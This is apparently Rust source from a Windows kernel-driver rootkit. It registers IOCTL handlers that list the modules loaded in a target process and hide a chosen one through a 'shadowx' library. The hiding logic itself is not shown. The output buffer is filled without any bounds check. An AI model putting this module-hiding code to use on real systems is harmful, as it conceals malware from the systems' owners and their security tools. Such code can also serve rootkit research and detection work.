use {
    alloc::boxed::Box,
    wdk_sys::{
        IO_STACK_LOCATION, IRP, 
        STATUS_SUCCESS
    },
};

use {
    crate::utils::{
        get_input_buffer, 
        get_output_buffer,
        ioctls::IoctlManager,
    },
    common::{
        ioctls::{ENUMERATE_MODULE, HIDE_MODULE}, 
        structs::{
            TargetModule,
            ModuleInfo, TargetProcess, 
        }
    },
};

/// Registers the IOCTL handlers for module-related operations.
/// 
/// This function registers handlers to manage module-related operations such as enumerating
/// loaded modules in a target process and hiding specific modules. These handlers are associated 
/// with specific IOCTL codes and provide functionality based on the requested module operations.
/// 
/// The following IOCTL operations are supported:
/// 
/// * **ENUMERATE_MODULE** - Retrieves the list of loaded modules in the target process.
/// * **HIDE_MODULE** - Hides a specific module in the target process.
/// 
/// # Arguments
/// 
/// * `ioctls` - A mutable reference to an `IoctlManager` where the module-related IOCTL handlers will be registered.
pub fn register_module_ioctls(ioctls: &mut IoctlManager) {
    // Enumerate loaded modules in the target process.
    ioctls.register_handler(ENUMERATE_MODULE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
        unsafe {
            // Get the target process from the input buffer.
            let target_process = get_input_buffer::<TargetProcess>(stack)?;
            let module_info = get_output_buffer::<ModuleInfo>(irp)?;
            let pid = (*target_process).pid;

            // Enumerate modules in the process.
            let modules = shadowx::Module::enumerate_module(pid)?;

            // Populate the output buffer with module information.
            for (index, module) in modules.iter().enumerate() {
                let info_ptr = module_info.add(index);

                // Copy module name and populate module information.
                core::ptr::copy_nonoverlapping(module.name.as_ptr(), (*info_ptr).name.as_mut_ptr(), module.name.len());
                (*info_ptr).address = module.address;
                (*info_ptr).index = index as u8;
            }

            // Update IoStatus with the number of modules enumerated.
            (*irp).IoStatus.Information = (modules.len() * size_of::<ModuleInfo>()) as u64;

            Ok(STATUS_SUCCESS)
        }
    }));

    // Hide a specific module in the target process.
    ioctls.register_handler(HIDE_MODULE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
        unsafe {
            // Get the target module information from the input buffer.
            let target = get_input_buffer::<TargetModule>(stack)?;
            
            // Hide the module based on the PID and module name.
            let status = shadowx::Module::hide_module((*target).pid, &(*target).module_name.to_lowercase())?;

            // Update IoStatus to indicate success.
            (*irp).IoStatus.Information = size_of::<TargetModule>() as u64;
            Ok(status)
        }
    }));
}
